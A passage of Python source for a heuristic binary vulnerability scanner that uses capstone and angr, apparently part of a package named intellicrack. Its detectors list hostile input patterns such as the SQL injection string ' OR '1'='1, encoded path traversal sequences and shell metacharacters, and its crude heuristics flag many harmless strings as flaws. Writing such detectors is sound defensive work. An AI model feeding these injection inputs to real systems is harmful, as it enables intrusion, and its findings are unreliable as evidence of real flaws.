                            "error_type": "overflow_condition",
                            "severity": "medium",
                        }
                        vulnerabilities.append(vuln)

            return vulnerabilities

        except Exception as e:
            self.logger.error("Error analyzing vulnerable paths: %s", e)
            return vulnerabilities

    def _native_vulnerability_discovery(
        self, vulnerability_types: list[str] | None = None
    ) -> list[dict[str, Any]]:
        """Native vulnerability discovery implementation without angr dependency.

        Performs comprehensive static and heuristic analysis to identify potential
        vulnerabilities using pattern matching, control flow analysis, and code inspection.

        Args:
            vulnerability_types: List of vulnerability types to look for

        Returns:
            List of discovered vulnerabilities with detailed information

        """
        if vulnerability_types is None:
            vulnerability_types = [
                "buffer_overflow",
                "integer_overflow",
                "use_after_free",
                "format_string",
                "command_injection",
                "path_traversal",
                "sql_injection",
                "xss",
                "memory_leak",
                "null_pointer_deref",
            ]

        self.logger.info("Starting native vulnerability discovery on %s", self.binary_path)
        self.logger.info("Target vulnerability types: %s", vulnerability_types)

        vulnerabilities = []

        try:
            # Read and analyze the binary file
            with open(self.binary_path, "rb") as f:
                binary_data = f.read()

            # Extract strings for analysis
            strings = self._extract_binary_strings(binary_data)

            # Perform disassembly if possible
            disasm_info = self._perform_basic_disassembly(binary_data)

            # Analyze each vulnerability type
            if "buffer_overflow" in vulnerability_types:
                vulns = self._detect_buffer_overflow_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "format_string" in vulnerability_types:
                vulns = self._detect_format_string_vulns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "integer_overflow" in vulnerability_types:
                vulns = self._detect_integer_overflow_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "command_injection" in vulnerability_types:
                vulns = self._detect_command_injection_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "use_after_free" in vulnerability_types:
                vulns = self._detect_use_after_free_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "path_traversal" in vulnerability_types:
                vulns = self._detect_path_traversal_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "sql_injection" in vulnerability_types:
                vulns = self._detect_sql_injection_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "memory_leak" in vulnerability_types:
                vulns = self._detect_memory_leak_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            if "null_pointer_deref" in vulnerability_types:
                vulns = self._detect_null_pointer_patterns(binary_data, strings, disasm_info)
                vulnerabilities.extend(vulns)

            # Remove duplicates and sort by severity
            vulnerabilities = self._deduplicate_and_rank_vulnerabilities(vulnerabilities)

            self.logger.info(
                "Native vulnerability discovery completed. Found %d potential vulnerabilities.",
                len(vulnerabilities),
            )
            return vulnerabilities

        except Exception as e:
            self.logger.error("Error during native vulnerability discovery: %s", e)
            return [{"error": f"Native vulnerability discovery failed: {e!s}"}]

    def _extract_binary_strings(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Extract strings from binary data for vulnerability analysis."""
        strings = []

        # ASCII strings
        import re

        ascii_pattern = re.compile(b"[ -~]{4,}")
        for match in ascii_pattern.finditer(binary_data):
            try:
                string_value = match.group(0).decode("ascii")
                strings.append(
                    {
                        "offset": match.start(),
                        "value": string_value,
                        "encoding": "ascii",
                        "length": len(string_value),
                    }
                )
            except UnicodeDecodeError as e:
                self.logger.error("UnicodeDecodeError in symbolic_executor: %s", e)

        # UTF-16 strings (Windows)
        utf16_pattern = re.compile(rb'(?:[A-Za-z0-9!@#$%^&*()_+={}\\[\]|\\:";\'<>?,./ ][\x00]){4,}')
        for match in utf16_pattern.finditer(binary_data):
            try:
                string_value = match.group(0).decode("utf-16le").rstrip("\x00")
                if len(string_value) >= 4:
                    strings.append(
                        {
                            "offset": match.start(),
                            "value": string_value,
                            "encoding": "utf-16le",
                            "length": len(string_value),
                        }
                    )
            except UnicodeDecodeError as e:
                logger.error("UnicodeDecodeError in symbolic_executor: %s", e)

        return strings

    def _perform_basic_disassembly(self, binary_data: bytes) -> dict[str, Any]:
        """Perform basic disassembly and control flow analysis."""
        disasm_info = {
            "instructions": [],
            "function_calls": [],
            "jumps": [],
            "system_calls": [],
            "dangerous_functions": [],
        }

        try:
            # Try to use capstone if available
            try:
                from intellicrack.handlers.capstone_handler import capstone

                # Detect architecture from binary header
                if binary_data.startswith(b"MZ"):  # PE file
                    cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
                elif binary_data.startswith(b"\x7fELF"):  # ELF file
                    if binary_data[4] == 2:  # 64-bit
                        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
                    else:  # 32-bit
                        cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
                else:
                    cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)

                cs.detail = True

                # Find code sections and disassemble
                code_sections = self._find_code_sections(binary_data)

                for section_offset, section_data in code_sections:
                    for instruction in cs.disasm(
                        section_data[: min(4096, len(section_data))], section_offset
                    ):
                        inst_info = {
                            "address": instruction.address,
                            "mnemonic": instruction.mnemonic,
                            "op_str": instruction.op_str,
                            "bytes": instruction.bytes,
                        }
                        disasm_info["instructions"].append(inst_info)

                        # Track function calls
                        if instruction.mnemonic in ["call", "jmp"]:
                            disasm_info["function_calls"].append(inst_info)

                            # Check for dangerous function calls
                            if any(
                                func in instruction.op_str.lower()
                                for func in [
                                    "strcpy",
                                    "sprintf",
                                    "gets",
                                    "scanf",
                                    "strcat",
                                    "memcpy",
                                ]
                            ):
                                disasm_info["dangerous_functions"].append(inst_info)

                        # Track jumps and branches
                        elif instruction.mnemonic.startswith("j"):
                            disasm_info["jumps"].append(inst_info)

                        # Track system calls
                        elif instruction.mnemonic in ["int", "syscall", "sysenter"]:
                            disasm_info["system_calls"].append(inst_info)

            except ImportError:
                self.logger.warning("Capstone not available - using basic pattern analysis")
                disasm_info = self._basic_pattern_analysis(binary_data)

        except Exception as e:
            self.logger.warning("Disassembly failed: %s", e)
            disasm_info = self._basic_pattern_analysis(binary_data)

        return disasm_info

    def _find_code_sections(self, binary_data: bytes) -> list[tuple]:
        """Find executable code sections in the binary."""
        code_sections = []

        try:
            if binary_data.startswith(b"MZ"):  # PE file
                # Basic PE parsing
                dos_header = binary_data[:64]
                if len(dos_header) >= 60:
                    pe_offset = int.from_bytes(dos_header[60:64], "little")
                    if pe_offset < len(binary_data) - 4:
                        pe_sig = binary_data[pe_offset : pe_offset + 4]
                        if pe_sig == b"PE\x00\x00":
                            # Found PE header - assume .text section starts at 0x1000
                            code_sections.append((0x1000, binary_data[0x1000:0x5000]))

            elif binary_data.startswith(b"\x7fELF"):  # ELF file
                # Basic ELF parsing - assume .text section
                code_sections.append((0x1000, binary_data[0x1000:0x5000]))

            else:
                # Unknown format - assume first 4KB contains code
                code_sections.append((0, binary_data[:4096]))

        except Exception as e:
            logger.error("Exception in symbolic_executor: %s", e)
            # Fallback - analyze first 4KB
            code_sections.append((0, binary_data[:4096]))

        return code_sections

    def _basic_pattern_analysis(self, binary_data: bytes) -> dict[str, Any]:
        """Basic pattern analysis when disassembly is not available."""
        patterns = {
            "instructions": [],
            "function_calls": [],
            "jumps": [],
            "system_calls": [],
            "dangerous_functions": [],
        }

        # Look for common x86 instruction patterns
        dangerous_patterns = [
            b"\xff\x25",  # jmp [mem] - indirect jump
            b"\xff\x15",  # call [mem] - indirect call
            b"\xcd\x80",  # int 0x80 - Linux system call
            b"\x0f\x05",  # syscall - 64-bit system call
        ]

        for pattern in dangerous_patterns:
            offset = 0
            while True:
                offset = binary_data.find(pattern, offset)
                if offset == -1:
                    break
                patterns["system_calls"].append(
                    {
                        "address": offset,
                        "pattern": pattern.hex(),
                        "description": "Potential system call",
                    }
                )
                offset += len(pattern)

        return patterns

    def _detect_buffer_overflow_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential buffer overflow vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes of binary data")
        self.logger.debug(
            f"Found {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Check for dangerous function usage in strings
        dangerous_functions = [
            "strcpy",
            "strcat",
            "sprintf",
            "gets",
            "scanf",
            "memcpy",
            "memmove",
            "strncpy",
            "strncat",
        ]

        for string in strings:
            for func in dangerous_functions:
                if func in string["value"].lower():
                    vuln = {
                        "type": "buffer_overflow",
                        "severity": "high" if func in ["strcpy", "gets", "sprintf"] else "medium",
                        "address": hex(string["offset"]),
                        "description": f'Dangerous function "{func}" found in binary',
                        "function": func,
                        "context": string["value"][:100],
                        "detection_method": "string_analysis",
                    }
                    vulnerabilities.append(vuln)

        # Check disassembly for dangerous function calls
        for func_call in disasm_info.get("dangerous_functions", []):
            vuln = {
                "type": "buffer_overflow",
                "severity": "high",
                "address": hex(func_call["address"]),
                "description": f'Dangerous function call: {func_call["op_str"]}',
                "instruction": f'{func_call["mnemonic"]} {func_call["op_str"]}',
                "detection_method": "disassembly_analysis",
            }
            vulnerabilities.append(vuln)

        # Look for large stack allocations
        for instruction in disasm_info.get("instructions", []):
            if instruction["mnemonic"] == "sub" and "esp" in instruction["op_str"]:
                # Extract immediate value for stack allocation
                import re

                immediate = re.search(r"0x([0-9a-fA-F]+)", instruction["op_str"])
                if immediate:
                    stack_size = int(immediate.group(1), 16)
                    if stack_size > 1024:  # Large stack allocation
                        vuln = {
                            "type": "buffer_overflow",
                            "severity": "low",
                            "address": hex(instruction["address"]),
                            "description": f"Large stack allocation: {stack_size} bytes",
                            "stack_size": stack_size,
                            "detection_method": "stack_analysis",
                        }
                        vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_format_string_vulns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential format string vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for format string vulnerabilities")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for format string patterns
        format_patterns = ["%s", "%d", "%x", "%n", "%p", "%%"]

        for string in strings:
            format_count = sum(string["value"].count(pattern) for pattern in format_patterns)
            if format_count > 0:
                # Check for potentially dangerous combinations
                if "%n" in string["value"]:
                    severity = "critical"
                    desc = "Format string with %n specifier detected - potential arbitrary write"
                elif format_count > 3:
                    severity = "high"
                    desc = f"Complex format string with {format_count} specifiers"
                else:
                    severity = "medium"
                    desc = f"Format string with {format_count} specifiers"

                vuln = {
                    "type": "format_string",
                    "severity": severity,
                    "address": hex(string["offset"]),
                    "description": desc,
                    "format_string": string["value"][:100],
                    "specifier_count": format_count,
                    "detection_method": "string_analysis",
                }
                vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_integer_overflow_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential integer overflow vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for integer overflow patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for arithmetic operations without bounds checking
        arithmetic_ops = ["add", "mul", "imul", "shl", "sal"]

        for instruction in disasm_info.get("instructions", []):
            if instruction["mnemonic"] in arithmetic_ops:
                # Look for operations on user-controlled data
                if "eax" in instruction["op_str"] or "rax" in instruction["op_str"]:
                    vuln = {
                        "type": "integer_overflow",
                        "severity": "medium",
                        "address": hex(instruction["address"]),
                        "description": f'Arithmetic operation without bounds checking: {instruction["mnemonic"]}',
                        "instruction": f'{instruction["mnemonic"]} {instruction["op_str"]}',
                        "detection_method": "instruction_analysis",
                    }
                    vulnerabilities.append(vuln)

        # Check for size calculations in strings
        size_keywords = ["size", "length", "count", "num", "malloc", "calloc"]
        for string in strings:
            for keyword in size_keywords:
                if keyword in string["value"].lower():
                    vuln = {
                        "type": "integer_overflow",
                        "severity": "low",
                        "address": hex(string["offset"]),
                        "description": f"Size calculation reference: {keyword}",
                        "context": string["value"][:100],
                        "detection_method": "string_analysis",
                    }
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_command_injection_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential command injection vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for command injection patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for system command execution
        dangerous_functions = ["system", "exec", "popen", "CreateProcess", "ShellExecute"]
        command_chars = [";", "|", "&", "`", "$", ">", "<"]

        for string in strings:
            # Check for dangerous function calls
            for func in dangerous_functions:
                if func in string["value"]:
                    vuln = {
                        "type": "command_injection",
                        "severity": "high",
                        "address": hex(string["offset"]),
                        "description": f"Command execution function: {func}",
                        "function": func,
                        "context": string["value"][:100],
                        "detection_method": "string_analysis",
                    }
                    vulnerabilities.append(vuln)

            # Check for command injection characters
            injection_chars = [char for char in command_chars if char in string["value"]]
            if injection_chars:
                vuln = {
                    "type": "command_injection",
                    "severity": "medium",
                    "address": hex(string["offset"]),
                    "description": f"Command injection characters found: {injection_chars}",
                    "characters": injection_chars,
                    "context": string["value"][:100],
                    "detection_method": "pattern_analysis",
                }
                vulnerabilities.append(vuln)

        # Analyze disassembly for command execution patterns
        if disasm_info and "instructions" in disasm_info:
            for instruction in disasm_info["instructions"]:
                mnemonic = instruction.get("mnemonic", "")
                op_str = instruction.get("op_str", "")

                # Look for calls to dangerous functions
                if mnemonic in ["call", "jmp"]:
                    if any(func.lower() in op_str.lower() for func in dangerous_functions):
                        vuln = {
                            "type": "command_injection",
                            "severity": "high",
                            "address": hex(instruction.get("address", 0)),
                            "description": f"Direct call to dangerous function in {op_str}",
                            "instruction": f"{mnemonic} {op_str}",
                            "detection_method": "disassembly_analysis",
                        }
                        vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_use_after_free_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential use-after-free vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for use-after-free patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for malloc/free patterns
        memory_functions = ["malloc", "free", "calloc", "realloc", "new", "delete"]

        for string in strings:
            for func in memory_functions:
                if func in string["value"].lower():
                    vuln = {
                        "type": "use_after_free",
                        "severity": "medium",
                        "address": hex(string["offset"]),
                        "description": f"Memory management function: {func}",
                        "function": func,
                        "context": string["value"][:100],
                        "detection_method": "string_analysis",
                    }
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_path_traversal_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential path traversal vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for path traversal patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for path traversal patterns
        traversal_patterns = ["../", "..\\", "%2e%2e%2f", "%2e%2e%5c"]

        for string in strings:
            for pattern in traversal_patterns:
                if pattern in string["value"].lower():
                    vuln = {
                        "type": "path_traversal",
                        "severity": "high",
                        "address": hex(string["offset"]),
                        "description": f"Path traversal pattern: {pattern}",
                        "pattern": pattern,
                        "context": string["value"][:100],
                        "detection_method": "pattern_analysis",
                    }
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_sql_injection_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential SQL injection vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for SQL injection patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for SQL keywords and injection patterns
        sql_keywords = ["SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "UNION", "OR", "AND"]
        injection_patterns = ["'", '"', "--", "/*", "*/", "UNION SELECT", "' OR '1'='1"]

        for string in strings:
            sql_count = sum(1 for keyword in sql_keywords if keyword in string["value"].upper())
            injection_count = sum(1 for pattern in injection_patterns if pattern in string["value"])

            if sql_count > 0 or injection_count > 0:
                severity = "high" if injection_count > 0 else "medium"
                vuln = {
                    "type": "sql_injection",
                    "severity": severity,
                    "address": hex(string["offset"]),
                    "description": f"SQL pattern detected - keywords: {sql_count}, injection patterns: {injection_count}",
                    "sql_keywords": sql_count,
                    "injection_patterns": injection_count,
                    "context": string["value"][:100],
                    "detection_method": "pattern_analysis",
                }
                vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_memory_leak_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential memory leak vulnerabilities."""
        vulnerabilities = []

        # Log analysis context
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for memory leak patterns")
        self.logger.debug(
            f"Processing {len(strings)} strings and {len(disasm_info.get('instructions', []))} instructions"
        )

        # Look for memory allocation without corresponding free
        alloc_functions = ["malloc", "calloc", "realloc", "new", "LocalAlloc", "GlobalAlloc"]

        for string in strings:
            for func in alloc_functions:
                if func in string["value"].lower():
                    vuln = {
                        "type": "memory_leak",
                        "severity": "low",
                        "address": hex(string["offset"]),
                        "description": f"Memory allocation function without visible free: {func}",
                        "function": func,
                        "context": string["value"][:100],
                        "detection_method": "static_analysis",
                    }
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_null_pointer_patterns(
        self, binary_data: bytes, strings: list[dict], disasm_info: dict
    ) -> list[dict[str, Any]]:
        """Detect potential null pointer dereference vulnerabilities."""
        vulnerabilities = []

        # Analyze strings for null pointer related error messages
        null_related_strings = []
        for string_entry in strings:
            string_val = string_entry.get("string", "").lower()
            if any(
                pattern in string_val
                for pattern in [
                    "null",
                    "nullptr",
                    "invalid pointer",
                    "segmentation fault",
                    "access violation",
                ]
            ):
                null_related_strings.append(string_entry)

        # Look for null checks and pointer operations in disassembly
        for instruction in disasm_info.get("instructions", []):
            # Look for comparisons with NULL (0)
            if instruction["mnemonic"] in ["cmp", "test"] and "0" in instruction["op_str"]:
                vuln = {
                    "type": "null_pointer_deref",
                    "severity": "medium",
                    "address": hex(instruction["address"]),
                    "description": f'Null pointer check: {instruction["mnemonic"]} {instruction["op_str"]}',
                    "instruction": f'{instruction["mnemonic"]} {instruction["op_str"]}',
                    "detection_method": "instruction_analysis",
                }
                vulnerabilities.append(vuln)

        # Search binary data for null pointer patterns
        if binary_data:
            # Look for patterns that might indicate null pointer vulnerabilities
            pattern_null_check = b"\x83\x3d"  # cmp dword ptr, 0
            pattern_positions = []
            start = 0
            while True:
                pos = binary_data.find(pattern_null_check, start)
                if pos == -1:
                    break
                pattern_positions.append(pos)
                start = pos + 1

            for pos in pattern_positions[:10]:  # Limit to first 10 matches
                vuln = {
                    "type": "null_pointer_deref",
                    "severity": "low",
                    "address": hex(pos),
                    "description": f"Null comparison pattern found in binary at offset {hex(pos)}",
                    "detection_method": "binary_pattern_analysis",
                    "pattern": "null_comparison_opcode",
                }
                vulnerabilities.append(vuln)

        # Add information about null-related strings found
        if null_related_strings:
            for string_entry in null_related_strings[:5]:  # Limit to first 5
                vuln = {
                    "type": "null_pointer_deref",
                    "severity": "info",
                    "address": hex(string_entry.get("vaddr", 0)),
                    "description": f'Null-related string: "{string_entry.get("string", "")}"',
                    "detection_method": "string_analysis",
                    "string_content": string_entry.get("string", ""),
                }
                vulnerabilities.append(vuln)

        return vulnerabilities

    def _deduplicate_and_rank_vulnerabilities(
        self, vulnerabilities: list[dict[str, Any]]
    ) -> list[dict[str, Any]]:
        """Remove duplicates and rank vulnerabilities by severity."""
        # Remove duplicates based on type and address
        seen = set()
        unique_vulns = []

        for vuln in vulnerabilities:
            key = (vuln["type"], vuln.get("address", ""))
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)

        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        unique_vulns.sort(key=lambda v: severity_order.get(v.get("severity", "low"), 3))

        return unique_vulns

    def _setup_heap_tracking(self, state):
        """Set up heap tracking for use-after-free detection."""
        if not hasattr(state, "heap"):
            return

        # Track heap allocations and frees
        state.heap._freed_chunks = {}
        state.heap._allocation_sites = {}

        # Hook malloc/free functions
        malloc_addr = state.project.loader.find_symbol("malloc")
        free_addr = state.project.loader.find_symbol("free")

        if malloc_addr:
            state.project.hook(malloc_addr.rebased_addr, self._malloc_hook, length=0)
        if free_addr:
            state.project.hook(free_addr.rebased_addr, self._free_hook, length=0)

    def _malloc_hook(self, state):
        """Hook for malloc to track allocations."""
        size = state.solver.eval(state.regs.rdi if state.arch.bits == 64 else state.regs.eax)

        # Perform the allocation
        addr = state.heap._malloc(size)

        # Track the allocation
        if hasattr(state.heap, "_allocation_sites"):
            state.heap._allocation_sites[addr] = {
                "size": size,
                "call_site": state.addr,
                "allocated_at": state.history.bbl_addrs[-1] if state.history.bbl_addrs else 0,
            }

        # Return the allocated address
        state.regs.rax = addr

    def _free_hook(self, state):
        """Hook for free to track deallocations and detect use-after-free."""
        ptr = state.solver.eval(state.regs.rdi if state.arch.bits == 64 else state.regs.eax)

        # Check if already freed (double-free)
        if hasattr(state.heap, "_freed_chunks") and ptr in state.heap._freed_chunks:
            self.logger.warning(f"Double free detected at {hex(state.addr)} for ptr {hex(ptr)}")

        # Track the deallocation
        if hasattr(state.heap, "_freed_chunks"):
            state.heap._freed_chunks[ptr] = {
                "freed_at": state.addr,
                "call_site": state.history.bbl_addrs[-1] if state.history.bbl_addrs else 0,
            }

        # Perform the free
        state.heap._free(ptr)

    def _setup_taint_tracking(self, state):
        """Set up taint tracking for data flow analysis."""
        # Initialize taint tracking plugin if available
        if hasattr(state, "plugins"):
            state.register_plugin("taint", TaintTracker())

        # Mark user input as tainted
        for i in range(len(state.solver.constraints)):
            constraint = state.solver.constraints[i]
            for var in constraint.variables:
                if "arg" in str(var) or "stdin" in str(var):
                    if hasattr(state.plugins, "taint"):
                        state.plugins.taint.add_taint(var, "user_input")

    def _check_race_condition(self, state, project) -> bool:
        """Check for potential race conditions."""
        try:
            # Look for multi-threading indicators
            threading_funcs = ["pthread_create", "CreateThread", "fork", "clone"]
            for func in threading_funcs:
                if func in project.kb.functions:
                    # Check if shared resources are accessed without synchronization
                    return self._analyze_synchronization(state, project)
            return False
        except Exception as e:
            self.logger.debug(f"Race condition check failed: {e}")
            return False

    def _analyze_synchronization(self, state, project) -> bool:
        """Analyze synchronization primitives usage."""
        # Look for mutex/lock usage
        sync_funcs = [
            "pthread_mutex_lock",
            "pthread_mutex_unlock",
            "EnterCriticalSection",
            "LeaveCriticalSection",
        ]
        sync_count = sum(1 for f in sync_funcs if f in project.kb.functions)

        # Check if state has accessed shared memory without locks
        try:
            if hasattr(state, "mem") and hasattr(state.mem, "get_symbolic_addrs"):
                shared_accesses = len(state.mem.get_symbolic_addrs())
                if shared_accesses > 0 and sync_count < 2:
                    return True
        except Exception as e:
            self.logger.debug(f"Error analyzing synchronization: {e}")

        # If threading is used but few sync primitives, potential race condition
        return sync_count < 2

    def _check_type_confusion(self, state, project) -> bool:
        """Check for potential type confusion vulnerabilities."""
        try:
            # Look for virtual function tables
            if hasattr(project.loader, "main_object"):
                # Check for C++ virtual tables
                for section in project.loader.main_object.sections:
                    if ".rdata" in section.name or ".rodata" in section.name:
                        # Look for vtable patterns
                        data = state.memory.load(section.vaddr, section.memsize)
                        if state.solver.symbolic(data):
                            return True
            return False
        except Exception as e:
            self.logger.debug(f"Type confusion check failed: {e}")
            return False

    def _setup_exploration_project(self, start_address: int) -> tuple[Any, Any]:
        """Setup angr project and initial state for exploration."""
        project = angr.Project(self.binary_path, auto_load_libs=False)

        # Verify start address is valid
        if start_address < project.loader.min_addr or start_address > project.loader.max_addr:
            raise ValueError(f"Invalid start address: 0x{start_address:x} outside of binary range")

        # Create initial state at the specified address
        initial_state = project.factory.blank_state(
            addr=start_address,
            add_options={
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
                angr.options.TRACK_MEMORY_ACTIONS,
                angr.options.TRACK_CONSTRAINT_ACTIONS,
                angr.options.TRACK_REGISTER_ACTIONS,
            },
        )

        return project, initial_state

    def _setup_symbolic_stdin_for_exploration(self, initial_state: Any, symbolic_stdin: bool, **kwargs) -> None:
        """Set up symbolic stdin if requested."""
        if symbolic_stdin:
            stdin_size = kwargs.get("stdin_size", 256)
            stdin_content = claripy.BVS("stdin", 8 * stdin_size)
            initial_state.posix.stdin.content = stdin_content
            self.logger.info(f"Created symbolic stdin of size {stdin_size}")

    def _apply_concrete_values_for_exploration(self, initial_state: Any, concrete_values: dict) -> None:
        """Apply concrete values if provided."""
        for addr, value in concrete_values.items():
            if isinstance(value, int):
                initial_state.memory.store(addr, initial_state.solver.BVV(value, 32))
            elif isinstance(value, bytes):
                initial_state.memory.store(addr, value)
            self.logger.debug(f"Set concrete value at 0x{addr:x}: {value}")

    def _create_custom_step_function(self, results: dict, find_addresses: list, track_constraints: bool, covered_blocks: set, path_constraints: dict, execution_paths: list) -> Any:
        """Create custom step function to track execution."""
        def custom_step(simgr):
            for stash in simgr.stashes:
                for state in simgr.stashes[stash]:
                    # Track covered blocks
                    if hasattr(state, "history"):
                        for addr in state.history.bbl_addrs:
                            covered_blocks.add(addr)

                    # Track path constraints
                    if track_constraints and state.solver.constraints:
                        path_id = len(execution_paths)
                        path_constraints[path_id] = {
                            "constraints": [str(c) for c in state.solver.constraints],
                            "satisfiable": state.solver.satisfiable(),
                            "variables": list(state.solver.variables),
                        }

                    # Check if we've reached target addresses
                    if state.addr in find_addresses:
                        results["reached_targets"].append(hex(state.addr))

                        # Extract concrete input that reaches this target
                        if hasattr(state, "posix") and state.posix.stdin.content:
                            try:
                                concrete_input = state.solver.eval(
                                    state.posix.stdin.content, cast_to=bytes
                                )
                                results["interesting_values"][hex(state.addr)] = {
                                    "input": concrete_input.hex(),
                                    "constraints": len(state.solver.constraints),
                                }
                            except Exception as e:
                                self.logger.debug(
                                    f"Error extracting concrete input at {hex(state.addr)}: {e}"
                                )

            return simgr.step()
        return custom_step

    def _execute_exploration_loop(self, simgr: Any, custom_step: Any, max_depth: int, timeout: int, find_addresses: list, avoid_addresses: list, project: Any, results: dict) -> None:
        """Execute the main exploration loop."""
        start_time = time.time()
        steps = 0

        while (
            len(simgr.active) > 0 and steps < max_depth and time.time() - start_time < timeout
        ):
            # Custom stepping to track execution
            simgr = custom_step(simgr)
            steps += 1

            # Move states that hit find addresses to found stash
            for state in list(simgr.active):
                if state.addr in find_addresses:
                    simgr.move("active", "found", lambda s, addr=state.addr: s.addr == addr)

            # Avoid specified addresses
            for state in list(simgr.active):
                if state.addr in avoid_addresses:
                    simgr.move("active", "avoided", lambda s, addr=state.addr: s.addr == addr)

            # Check for vulnerabilities in active states
            if steps % 10 == 0:  # Check every 10 steps for performance
                for state in simgr.active:
                    vuln = self._check_state_for_vulnerabilities(state, project)
                    if vuln:
                        results["vulnerabilities"].extend(vuln)

    def _analyze_exploration_results(self, simgr: Any, project: Any, start_address: int, covered_blocks: set, results: dict) -> None:
        """Analyze final exploration results."""
        all_states = simgr.active + simgr.deadended + simgr.found
        results["paths_found"] = len(all_states)

        # Build execution tree
        execution_tree = self._build_execution_tree(all_states, start_address)
        results["execution_tree"] = execution_tree

        # Calculate coverage
        if project.loader.main_object:
            total_blocks = len(list(project.analyses.CFGFast().graph.nodes()))
            if total_blocks > 0:
                results["coverage"] = (len(covered_blocks) / total_blocks) * 100

        # Collect all constraints
        for state in all_states:
            if state.solver.constraints:
                constraint_info = {
                    "path_address": hex(state.addr),
                    "constraints": [str(c) for c in state.solver.constraints],
                    "num_constraints": len(state.solver.constraints),
                    "satisfiable": state.solver.satisfiable(),
                }
                results["constraints"].append(constraint_info)

    def _extract_interesting_test_cases(self, simgr: Any, find_addresses: list, start_address: int, results: dict) -> None:
        """Extract interesting test cases from exploration results."""
        interesting_states = simgr.found + [
            s for s in simgr.deadended if s.addr in find_addresses
        ]
        for state in interesting_states[:10]:  # Limit to 10 most interesting
            try:
                # Generate concrete inputs for interesting states
                if hasattr(state, "posix") and state.posix.stdin.content:
                    concrete_input = state.solver.eval(state.posix.stdin.content, cast_to=bytes)
                    results["interesting_values"][f"state_{hex(state.addr)}"] = {
                        "input": concrete_input.hex(),
                        "path_length": len(state.history.bbl_addrs)
                        if hasattr(state, "history")
                        else 0,
                        "reached_from": hex(start_address),
                    }
            except Exception as e:
                self.logger.debug(f"Failed to extract concrete values: {e}")

    def explore_from(self, start_address: int, **kwargs) -> dict[str, Any]:
        """Explore execution paths from a specific start address.

        This method performs targeted symbolic execution starting from a given address,
        exploring all reachable paths and analyzing program behavior, vulnerabilities,
        and constraints along each path.

        Args:
            start_address: The address to start exploration from (can be function entry, basic block, etc.)
            **kwargs: Additional parameters:
                - max_depth: Maximum exploration depth (default: 50)
                - find_addresses: List of target addresses to find
                - avoid_addresses: List of addresses to avoid
                - timeout: Exploration timeout in seconds (default: 300)
                - track_constraints: Whether to track path constraints (default: True)
                - symbolic_stdin: Whether to make stdin symbolic (default: False)
                - concrete_values: Dict of address->value for concretization

        Returns:
            Dict containing:
